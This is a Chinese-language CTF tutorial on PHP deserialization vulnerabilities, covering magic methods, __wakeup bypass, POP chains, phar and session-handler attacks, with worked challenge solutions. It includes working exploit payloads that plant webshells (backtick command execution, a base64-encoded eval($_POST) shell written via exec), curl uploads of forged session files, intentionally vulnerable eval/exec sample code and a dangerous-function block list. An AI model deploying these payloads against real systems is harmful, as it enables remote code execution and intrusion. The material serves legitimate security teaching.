# PHP反序列化漏洞

序列化是将**数据结构**或**对象状态**转换为**可存储或传输的格式**的过程，以便在不同平台或环境中交换或保存，并在需要时恢复原始状态。

反序列化是将序列化后的数据（如字符串，字节流等）**还原**为原始对象的过程。

PHP 提供了两个内置函数实现序列化和反序列化：

- [serialize()](https://www.php.net/manual/zh/function.serialize.php)，序列化函数，生成值的可存储表示。可处理所有的类型，除了 resource 类型和一些 object（大多数是没有序列化接口的内置对象）

- [unserialize()](https://www.php.net/manual/zh/function.unserialize.php)，反序列化函数，从已存储的表示中创建 PHP 的值

## 基础

### 序列化字符串格式

#### 基本类型的序列化字符串格式

```php
<?php
echo "整型 " . serialize(10) . PHP_EOL; // 整型 i:10;
echo "浮点型 " . serialize(13.14).PHP_EOL; // 浮点型 d:13.14;
echo "字符串 " . serialize("This is a string"). PHP_EOL; // 字符串 s:16:"This is a string";
echo "布尔型 " . serialize(FALSE). PHP_EOL; // 布尔型 b:0;
echo "NULL " . serialize(NULL). PHP_EOL; // NULL N;
echo "数组 " . serialize(['foo', 'bar', 'baz']). PHP_EOL; // 数组 a:3:{i:0;s:3:"foo";i:1;s:3:"bar";i:2;s:3:"baz";}
```

- 反序列化示例

```php
$a = unserialize('s:16:"This is a string";');
var_dump($a); // string(16) "This is a string"
```

- 例题

```php
<?php
if(unserialize($_GET['name']) === 'admin') {
  echo "flag{...}";
}
```

#### 对象的序列化字符串格式

[对象序列化](https://www.php.net/manual/zh/language.oop5.serialization.php)

```php
<?php
class Person
{
    public $username = 'john';
    protected $age = 20;
    private $isOK = false;

    public function get_username() {
        return $this->usernme;
    }
}

$p = new Person();
$serialized = serialize($p);
// 由于ASCII为0的字符不可见，替换为%00
echo str_replace("\x00", "%00", $serialized);
```

结果示例：

```php
O:6:"Person":3:{s:8:"username";s:4:"john";s:6:"%00*%00age";i:20;s:12:"%00Person%00isOK";b:0;}
// O:类名长度:类名:属性个数:{s:属性名长度:属性名;s:属性值长度:属性值;...}
```

序列化字符串的特点：

- 序列化字符串仅包含属性，不包含方法。
- 属性的访问控制不同，序列化后表现形式也不同：
  - `protected` 属性表示为 `%00*%00`
  - `private` 属性表示为 `%00类名%00`

### 常见魔术方法

魔术方法是一种特殊的方法，会在对象执行某些操作时覆盖 PHP 的默认操作，[了解更多](https://www.php.net/manual/zh/language.oop5.magic.php)

#### 魔术方法名称及说明

```php
<?php
class Person {
    public $name, $age;

    function __construct($name, $age) {
        echo "__construct" . PHP_EOL;
        $this->name = $name;
        $this->age = $age;
    }

    public function get_name() {
        return  $this->name;
    }

    function __destruct() {
        echo "__destruct" . PHP_EOL;
    }

    public function __toString() {
        echo "__toString" . PHP_EOL;
        return "";
    }

    public function __wakeup() {
        echo "__wake_up" . PHP_EOL;
    }

    public function __sleep() {
        echo "__sleep" . PHP_EOL;
        return [];
    }

    public function __invoke() {
        echo "__invoke" . PHP_EOL;
    }

    public function __set($name, $value) {
        echo "__set" . PHP_EOL;
    }

    public function __get($name) {
        echo "__get" . PHP_EOL;
    }

    public function __call($name, $arguments) {
        echo "__call" . PHP_EOL;
    }
}

$o = new Person('Alice', 18);

// 对象被当成字符串时调用
echo $o;

// 以调用函数的方式调用对象
$o();

// 访问不存在的属性
$o->not_found_property;
// 给不存在的属性赋值
$o->not_found_property = 'test';

// 调用一个不可访问方法
$o->not_found_method();

// 序列化和反序列化
$serialized = serialize($o);
unserialize($serialized);

/* 输出
__construct
__toString
__invoke
__get
__set
__call
__sleep
__wake_up
__destruct
*/
```

| 魔术方法名称    | 说明                                                           |
| --------------- | -------------------------------------------------------------- |
| \_\_sleep()     | serialize() 时调用                                             |
| \_\_wakeup()    | unserialize() 时调用                                           |
| \_\_toString()  | 用于一个对象被当成字符串时调用                                 |
| \_\_invoke()    | 当尝试以调用函数的方式调用一个对象时                           |
| \_\_construct() | 构造函数，每次创建新对象时先调用此方法                         |
| \_\_destruct()  | 析构函数，某个对象的所有引用都被删除或者当对象被显式销毁时执行 |
| \_\_set()       | 在给不可访问（protected 或 private）或不存在的属性赋值时       |
| \_\_get()       | 读取不可访问（protected 或 private）或不存在的属性的值时       |
| \_\_call()      | 当对象调用一个不可访问方法时                                   |

### 例题分析

```php
<?php
class test {
    public $cmd;

    function __destruct() {
        eval($this->cmd);
    }
}

unserialize($_GET['u']);
```

`test`类的析构函数`__destruct()`存在代码执行漏洞。需要在本地调试代码，生成所需要的序列化字符串。

- EXP：

```php
<?php
// 类名与题目类名保持一致
class test {
  // 只保留属性，可直接赋值
  public $cmd='?><?=`$_GET[cmd]`;';

  // 不保留方法
}
// 实例化对象
$o = new test;

// 也可通过访问对象属性赋值
// $o->cmd = '';

// 输出序列化字符串，必要时可进行URL编码
echo serialize($o);
// O:4:"test":1:{s:3:"cmd";s:18:"?><?=`$_GET[cmd]`;";}
```

### 练习题

- BUUCTF - [NewStarCTF 2023 公开赛道]Unserialize?

## 常见绕过方法

- `__wakeup()`方法绕过（[CVE-2016-7124](https://www.cve.org/CVERecord?id=CVE-2016-7124)）

```text
When an unexpected object is created, __wakeup() is not invoked during deserialization, which could allow an attacker to bypass __wakeup() and invoke __destruct() with crafted properties.
PHP before 5.6.25 and 7.x before 7.0.10
```

当序列化字符串中表示对象属性个数的值**大于**真实属性个数时会跳过`__wakeup()`的执行

例题分析：

```php
<?php
highlight_file(__FILE__);

class User {
    public $name;

    function __construct($name) {
        $this->name = $name;
    }

    function __wakeup() {
        $this->name = "Guest";
    }

    function __destruct() {
        if ($this->name === "Admin") {
            echo "Greetings, Admin! Your flag is: FLAG{example_flag}";
        }
        echo "Goodbye, " . $this->name . "!";
    }
}

unserialize($_GET['u']);
```

EXP：

```
O:4:"User":2:{s:4:"name";s:5:"Admin";}
```

- `PHP > 7.1` 反序列化时对类属性的**访问控制**不敏感，只要属性名相同，就可以正常反序列化
- 表示字符类型的标识`S`为**大写**时，其内容会被当成十六进制解析，如`S:3:"\61\62\63"`
- 使用`+`绕过`preg_match('/^O:\d+/')`正则检查，如`O:+4:"test"`

练习题

- BUUCTF - [NewStarCTF 2023 公开赛道]Unserialize Again

## POP 链构造

面向属性编程（Property-Oriented Programing）

- 题眼

题目中有多个类，且每个类存在魔术方法

## 练习题

- BUUCTF - [NewStarCTF 公开赛赛道]UnserializeOne

## Phar 反序列化

### phar 文件介绍

`phar`扩展提供了一种将整个 PHP 应用程序放入单个叫做`phar`（PHP 归档）文件的方法，以便于分发和安装。phar 是 PHP 和 Archive 的合成词，大致上基于 Java 开发人员熟悉的 jar（Java 归档）。

phar 文件由[4 部分组成](https://www.php.net/manual/zh/phar.fileformat.phar.php)：

1. `stub`，标志，格式为`xxx<?php xxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`结尾
2. `manifest`，清单。其中还会经`serialize()`序列化保存`Meta-data`
3. `contents`，内容
4. `signature`，签名，可选

`phar://`协议

```php
<?php
include 'phar:///path/to/myphar.phar/file.php';
?>
```

### 漏洞原理

2018 年，安全研究员`Sam Thomas`分享了议题[It’s a PHP unserialization vulnerability Jim, but not as we know it](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)，利用 phar 文件会以序列化的形式存储用户自定义的`meta-data`这一特性，拓展了 PHP 反序列化漏洞的攻击面。

题眼

- 允许上传精心构造的 phar 文件
- 允许使用`phar://`

添加任意的文件头+修改后缀名的方式将 phar 文件伪装成其他格式的文件

### 创建 phar 文件

?> 需将`php.ini`中的`phar.readonly`选项设置为`Off`，否则无法生成 phar 文件。

```php
<?php
class AnyClass
{
    public function __destruct()
    {
        echo "__destruct" . PHP_EOL;
    }
}

@unlink("test.phar"); // 删除已有文件
$phar = new Phar("test.phar"); //文件名，后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
$object = new AnyClass();
$phar->setMetadata($object); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

// 本地测试
if (file_exists("test.phar")) {
    file_get_contents("phar://test.phar");
}

```

在`meta-data`部分内容以序列化形式存储。

```bash
$ xxd test.phar
00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  <?php __HALT_COM
00000010: 5049 4c45 5228 293b 203f 3e0d 0a49 0000  PILER(); ?>..I..
00000020: 0001 0000 0011 0000 0001 0000 0000 0013  ................
00000030: 0000 004f 3a38 3a22 416e 7943 6c61 7373  ...O:8:"AnyClass
00000040: 223a 303a 7b7d 0800 0000 7465 7374 2e74  ":0:{}....test.t
00000050: 7874 0400 0000 dbee 2a68 0400 0000 0c7e  xt......*h.....~
00000060: 7fd8 b601 0000 0000 0000 7465 7374 8b7e  ..........test.~
00000070: 036c b419 d175 41e8 8c81 e4bd 8cf3 4b6e  .l...uA.......Kn
00000080: ca61 0200 0000 4742 4d42                 .a....GBMB
```

### 例题分析

<!-- [GXYCTF2019]BabysqliV3.0 -->

#### 例题1：[NewStarCTF 2023 公开赛道] PharOne

首页为文件上传，查看网页源代码，提示`class.php`，直接访问得源代码如下：

```php
<?php
highlight_file(__FILE__);
class Flag
{
    public $cmd;
    public function __destruct()
    {
        @exec($this->cmd);
    }
}
@unlink($_POST['file']);

```

经典反序列化题目，但是没有`unserialize()`函数。上传`phar`文件，使用`unlink`函数触发`phar://`协议。

```php
<?php
class Flag
{
    public $cmd = "echo PD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+|base64 -d > upload/shell.php";
}

@unlink("test.phar"); // 删除已有文件
$phar = new Phar("test.phar"); //文件名，后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
$object = new Flag();
$phar->setMetadata($object); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

```

- 文件后缀名检测，白名单文件上传，仅支持图片后缀上传。
- 上传正常 phar 文件时，提示`!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)` ，使用 gzip 压缩绕过

```bash
gzip test.phar
```

```
file=pupload/fa75c83c80cab8c9dc30d3f1c1b6f610.gif
```

#### [SWPUCTF 2018]SimplePHP

题目存在任意文件读取漏洞，获取题目源代码。

- `file.php?file=function.php`

```php
<?php
//show_source(__FILE__); 
include "base.php";
header("Content-type: text/html;charset=utf-8");
error_reporting(0);
function upload_file_do()
{
    global $_FILES;
    $filename = md5($_FILES["file"]["name"] . $_SERVER["REMOTE_ADDR"]) . ".jpg";
    //mkdir("upload",0777); 
    if (file_exists("upload/" . $filename)) {
        unlink($filename);
    }
    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
    echo '<script type="text/javascript">alert("上传成功!");</script>';
}
function upload_file()
{
    global $_FILES;
    if (upload_file_check()) {
        upload_file_do();
    }
}
function upload_file_check()
{
    global $_FILES;
    $allowed_types = array("gif", "jpeg", "jpg", "png");
    $temp = explode(".", $_FILES["file"]["name"]);
    $extension = end($temp);
    if (empty($extension)) {
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } else {
        if (in_array($extension, $allowed_types)) {
            return true;
        } else {
            echo '<script type="text/javascript">alert("Invalid file!");</script>';
            return false;
        }
    }
}

```

- `file.php?file=file.php`

```php
<?php
header("content-type:text/html;charset=utf-8");
include 'function.php';
include 'class.php';
ini_set('open_basedir', '/var/www/html/');
$file = $_GET["file"] ? $_GET['file'] : "";
if (empty($file)) {
    echo "<h2>There is no file to show!<h2/>";
}
$show = new Show();
if (file_exists($file)) {
    $show->source = $file;
    $show->_show();
} else if (!empty($file)) {
    die('file doesn\'t exists.');
}
```

- `file.php?file=class.php`

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key, $value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if (preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i', $this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
    }
    public function __wakeup()
    {
        if (preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if (isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}

```

### 练习题

- [D3CTF 2019]EzUpload
- [NewStarCTF 2023 公开赛道]Unserialize Again
- [CISCN2019 华北赛区 Day1 Web1]Dropbox

```php
<?php
class dir
{
    public $userdir;
    public $url;
    public $filename;

    // 构造函数，为每个用户创建独立的目录
    public function __construct($url, $filename)
    {
        $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
        $this->url = $url;
        $this->filename = $filename;
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }

    // 检查目录
    public function checkdir()
    {
        if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
            die('hacker!!!');
        }
    }

    // 检查url，协议不能为空，也不能是file、php
    public function checkurl()
    {
        $r = parse_url($this->url);
        if (!isset($r['scheme']) || preg_match("/file|php/i", $r['scheme'])) {
            die('hacker!!!');
        }
    }

    // 检查文件名，不能包含..、/，后缀不能有ph
    public function checkext()
    {
        if (stristr($this->filename, '..')) {
            die('hacker!!!');
        }
        if (stristr($this->filename, '/')) {
            die('hacker!!!');
        }
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)) {
            die('hacker!!!');
        }
    }
    public function upload()
    {
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
        $content = file_get_contents($this->url, NULL, NULL, 0, 2048);
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)) {
            die('hacker!!!');
        }
        file_put_contents($this->userdir . "/" . $this->filename, $content);
    }
    public function remove()
    {
        $this->checkdir();
        $this->checkext();
        if (file_exists($this->userdir . "/" . $this->filename)) {
            unlink($this->userdir . "/" . $this->filename);
        }
    }
    public function count($dir)
    {
        if ($dir === '') {
            $num = count(scandir($this->userdir)) - 2;
        } else {
            $num = count(scandir($dir)) - 2;
        }
        if ($num > 0) {
            return "you have $num files";
        } else {
            return "you don't have file";
        }
    }
    public function __toString()
    {
        return implode(" ", scandir(__DIR__ . "/" . $this->userdir));
    }
    public function __destruct()
    {
        $string = "your file in : " . $this->userdir;
        file_put_contents($this->filename . ".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])) {
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'], $_POST['filename']);
if ($_POST['action'] === "upload") {
    $dir->upload();
} elseif ($_POST['action'] === "remove") {
    $dir->remove();
} elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])) {
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}
```

### 参考资料

- <https://paper.seebug.org/680/>
- <https://www.anquanke.com/post/id/240007>

## session 反序列化

在 Web 开发中，HTTP 协议是**无状态**的。这意味着服务器默认不会记住上一个请求来自谁，每个请求都是独立的。但现实中的应用（如购物车、用户登录）都需要“记住”用户的状态。

PHP Session 是一个在**服务器端存储用户状态信息**的强大机制，它通过一个存储在客户端的**Session ID Cookie** 来将用户与其数据关联起来。

```php
<?php
// 开启session会话
session_start();

$_SESSION['username'] = 'Alice';
```

会话开始：当用户第一次访问一个启动了 Session 的 PHP 页面（通常通过 session_start() 函数），PHP 会做两件事：

生成一个唯一标识符：称为 Session ID（例如 c7c7c6d5a2a10e4b7c882e4e5a59d3b0）。

通过 Cookie 发送这个 ID 给浏览器：这个 Cookie 通常命名为 PHPSESSID。

后续请求：用户在站点的每一个后续请求，浏览器都会自动在请求头中携带这个 PHPSESSID Cookie。

服务器识别用户：服务器（PHP）接收到请求后，读取 PHPSESSID，并通过这个 ID 找到服务器上存储的对应 Session 数据文件。

数据存储与读取：

存储：你的脚本可以将任何数据（字符串、数组、对象等）保存在超全局数组 $_SESSION 中（例如 $_SESSION['username'] = 'Alice';）。

读取：在其他页面上，只要启动了 session_start()，你就可以直接访问 $_SESSION['username'] 来获取值 'Alice'。

会话结束：当用户关闭浏览器或 Session 超时（默认通常是 24 分钟），会话被视为结束。服务器最终会清理掉过期的 Session 文件。

PHP 默认将会话数据（$_SESSION 超全局数组中的内容）序列化后，以一个文件的形式存储在服务器上（例如 /tmp/sess_abc123）。

| [常见配置选项](https://www.php.net/manual/en/session.configuration.php) | 说明 |
|--- | --- |
| session.save_handler | 保存形式，默认为 files |
| session.save_path | 保存路径，默认路径有`/tmp/`、`/var/lib/php/` |
| session.serialize_handler | 序列化处理器名称，有`php`、`php_binary`和`php_serialize`三种，默认为`php` |

不同序列化处理器，序列化数据存储格式不同

```php
<?php
// 设置脚本执行期间的session处理器，php、php_binary、php_serialize
ini_set('session.serialize_handler', 'php_binary');

// 开启session会话
session_start();

$_SESSION['name'] = 'Alice';
$_SESSION['age'] = 25;
```

| 处理器名称    | 数据存储格式 |
| ------------- | --------- |
| php           | 键名 + 竖线 + 经过 serialize() 函数序列化处理的值，如 `name\|s:5:"Alice";age\|i:25;` |
| php_binary    | 键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize()函数序列化处理的值，如 `\x04names:5:"Alice";\x03agei:25;` |
| php_serialize | $\_SESSION 数组经 serialize()函数处理，如 `a:2:{s:4:"name";s:5:"Alice";s:3:"age";i:25;}` |

如果`session`在序列化和反序列化时使用的处理器不同，会导致读写数据出现不一致。在特定情况下，这会产生反序列化漏洞。混合使用 `php` 处理器和 `php_serialize` 处理器时，情况尤为明显。

假设提交的数据为 `name=|O:4:"test":0:{}`

- 如果存储时使用 `php_serialize` 处理器，数据将被存储为 `a:1:{s:4:"name";s:16:"|O:4:"test":0:{}";}`
- 而如果读取时使用 `php` 处理器，处理器会将 `|` 前面的内容识别为键名，而将 `O:4:"test":0:{}` 作为值进行反序列化，从而触发反序列化漏洞

### 例题分析

`[BUUCTF]2020-HFCTF-BabyUpload`

```php
<?php
error_reporting(0);
session_save_path("/var/babyctf/");
session_start();
require_once "/flag";
highlight_file(__FILE__);
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION['username'] ='guest';
}
$direction = filter_input(INPUT_POST, 'direction');
$attr = filter_input(INPUT_POST, 'attr');
$dir_path = "/var/babyctf/".$attr;
if($attr==="private"){
    $dir_path .= "/".$_SESSION['username'];
}
if($direction === "upload"){
    try{
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
            throw new RuntimeException('invalid upload');
        }
        $file_path = $dir_path."/".$_FILES['up_file']['name'];
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
            $upload_result = "uploaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $upload_result = $e->getMessage();
    }
} elseif ($direction === "download") {
    try{
        $filename = basename(filter_input(INPUT_POST, 'filename'));
        $file_path = $dir_path."/".$filename;
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException('file not exist');
        }
        header('Content-Type: application/force-download');
        header('Content-Length: '.filesize($file_path));
        header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');
        if(readfile($file_path)){
            $download_result = "downloaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $download_result = $e->getMessage();
    }
    exit;
}
?>
```

- [file_exists](https://www.php.net/manual/zh/function.file-exists.php) — 检查文件或目录是否存在
- 下载当前用户的 session 文件，判断处理器类型为`php_binary`
- 生成目标 session 文件

```php
<?php
ini_set('session.serialize_handler', 'php_binary');
session_start();

$_SESSION['username'] = 'admin';
```

- 计算文件的 sha256

```bash
sha256sum sess_xxx
# 432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4
```

- 上传文件

```bash
curl -X POST -F "up_file=@/tmp/sess_2;filename=sess;" -F "direction=upload" http://f39c4ab1-8cf6-47a3-bc18-cbf23dce4c98.node5.buuoj.cn:81/

curl -X POST -F "up_file=@/tmp/sess_2;filename=sess;" -F "attr=success.txt" -F "direction=upload" http://f39c4ab1-8cf6-47a3-bc18-cbf23dce4c98.node5.buuoj.cn:81/
```

此外也可以通过构建上传表单进行文件上传

```html
<form enctype="multipart/form-data" action="http://a917c0b3-2b1c-40ff-bd57-e804d096a865.node5.buuoj.cn:81/" method="POST">
    <!-- MAX_FILE_SIZE must precede the file input field -->
    <input type="hidden" name="MAX_FILE_SIZE" value="30000" />
    <input type="hidden" name="direction" value="upload" />
    <!-- <input type="hidden" name="attr" value="success.txt" /> -->
    
    <!-- Name of input element determines name in $_FILES array -->
    Send this file: <input name="up_file" type="file" />
    <input type="submit" value="Send File" />
</form>
```

例题：Jarvis OJ — PHPINFO 分析

题眼

- 可以控制`session`的内容
- 脚本文件指定了处理器

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

<http://web.jarvisoj.com:32784/>

1. 存在恶意类`OowoO`，析构方法中存在代码执行漏洞
2. 通过 `phpinfo()` 可知：

- _`session.upload_progress.enabled=On`_，可用文件上传在`session`中写入数据
- _`session.serialize_handler`_ 的默认值为`php_serialize`，脚本运行时配置为`php`，**处理器不一致**

3. 我们可通过文件上传控制`session`文件内容，进而实现`session`反序列化漏洞攻击

<!--
https://xz.aliyun.com/t/6640

相关题目
2020 高校战役赛 Hackme
https://miaotony.xyz/2020/11/05/CTF_2020_0xGame/#toc-heading-4
LCTF2018 bestphp’s revenge

漏洞:
Joomla 1.5-3.4 P168
-->

例题：Jarvis OJ — PHPINFO 解题步骤

1. 生成`payload`

```php
<?php
class OowoO{
    public $mdzz = '?><?=`$GET["cmd"]`';
}
$obj  = new OowoO();
echo serialize($obj);
// O:5:"OowoO":1:{s:4:"mdzz";s:18:"?><?=`$GET["cmd"]`";}
?>
```

2. 构造文件上传进度请求

```html
<form
  action="http://web.jarvisoj.com:32784/"
  method="POST"
  enctype="multipart/form-data"
>
  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
  <input type="file" name="file" />
  <input type="submit" />
</form>
```

## 字符逃逸

<!--
https://medium.com/@lyltvip/php-deserialization-escape-970cd8ea714e
-->

## PHP 原生类

PHP 内置类

读取目录、文件

- [DirectoryIterator](https://www.php.net/manual/zh/class.directoryiterator.php) - 列出当前目录下的文件信息
- [Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php) - 以绝路路径的形式列出的文件信息
- [Globlterator](https://www.php.net/manual/zh/class.globiterator.php) - 遍历一个文件目录，可以通过模式匹配来寻找文件路径

- [SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php) - SplFileInfo 类为单个文件的信息提供了高级的面向对象接口

## 练习题

- 基础
  - 极客大挑战 2019 php
  - 2020-网鼎杯朱雀组-phpweb
- POP
  - ISCC_2022_POP2022
  - 强网杯_2021_赌徒
  - 网鼎杯_2020_青龙组 AreUSerialz
  - ISCC_2022_findme
  - GYCTF2020 Easyphp
- 字符逃逸
  - 强网杯\_2020_Web 辅助

### 极客大挑战 2019 php

1. 目录扫描，`www.zip`
2. 绕过`__wakeup()`

```php
class Name {
 private $username = 'admin';
 private $password = 100;
}

$o = new Name;
// 由于属性为私有，采用URL编码
echo urlencode(serialize($o));
```

```php
O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```

### buuctf - 2020-网鼎杯朱雀组-phpweb

```php
<?php
$disable_fun = array(
    "exec",
    "shell_exec",
    "system",
    "passthru",
    "proc_open",
    "show_source",
    "phpinfo",
    "popen",
    "dl",
    "eval",
    "proc_terminate",
    "touch",
    "escapeshellcmd",
    "escapeshellarg",
    "assert",
    "substr_replace",
    "call_user_func_array",
    "call_user_func",
    "array_filter",
    "array_walk",
    "array_map",
    "registregister_shutdown_function",
    "register_tick_function",
    "filter_var",
    "filter_var_array",
    "uasort",
    "uksort",
    "array_reduce",
    "array_walk",
    "array_walk_recursive",
    "pcntl_exec",
    "fopen",
    "fwrite",
    "file_put_contents"
);
function gettime($func, $p)
{
    $result = call_user_func($func, $p);
    $a = gettype($result);
    if ($a == "string") {
        return $result;
    } else {
        return "";
    }
}
class Test
{
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct()
    {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];
if ($func != null) {
    $func = strtolower($func);
    if (!in_array($func, $disable_fun)) {
        echo gettime($func, $p);
    } else {
        die("Hacker...");
    }
}

```

### ISCC_2022_POP2022

```php
<?php
echo 'Happy New Year~ MAKE A WISH<br>';
if (isset($_GET['wish'])) {
    @unserialize($_GET['wish']);
} else {
    $a = new Road_is_Long;
    highlight_file(__FILE__);
}
/***************************pop your 2022*****************************/
class Road_is_Long
{
    public $page;
    public $string;
    public function __construct($file = 'index.php')
    {
        $this->page = $file;
    }
    public function __toString()
    {
        return $this->string->page;
    }
    public function __wakeup()
    {
        if (preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page)) {
            echo "You can Not Enter 2022";
            $this->page = "index.php";
        }
    }
}
class Try_Work_Hard
{
    protected  $var;
    public function append($value)
    {
        include($value);
    }
    public function __invoke()
    {
        $this->append($this->var);
    }
}
class Make_a_Change
{
    public $effort;
    public function __construct()
    {
        $this->effort = array();
    }
    public function __get($key)
    {
        $function = $this->effort;
        return $function();
    }
}
/**********************Try to See flag.php*****************************/

```

EXP:

```php
<?php
class Road_is_Long
{
    public $page;
    public $string;

}

class Try_Work_Hard
{
    protected  $var = 'php://filter/convert.base64-encode/resource=flag.php';
}

class Make_a_Change
{
    public $effort;
}

$o = new Road_is_Long;
$o->page = new Road_is_Long;
$o->page->string = new Make_a_Change;
$o->page->string->effort = new Try_Work_Hard;

$payload = serialize($o);
echo 'payload:<br>' . $payload . '<br>';
echo urlencode($payload); 
```
